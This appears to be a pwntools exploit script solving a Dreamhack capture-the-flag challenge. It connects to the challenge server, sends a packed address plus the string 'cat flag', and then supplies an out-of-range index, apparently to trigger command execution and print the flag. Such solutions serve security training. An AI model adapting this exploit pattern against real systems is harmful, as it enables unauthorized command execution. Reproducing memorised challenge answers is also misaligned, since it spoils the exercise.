from pwn import *
r = remote("host1.dreamhack.games", 17586)
r.recv()

payload = p32(0x804a0b0) # addr of name[16]
payload += b"cat flag"

r.sendline(payload)
r.recv()
r.sendline("19") # addr number of idx

flag = r.recvuntil("}").decode('utf-8')

print(flag)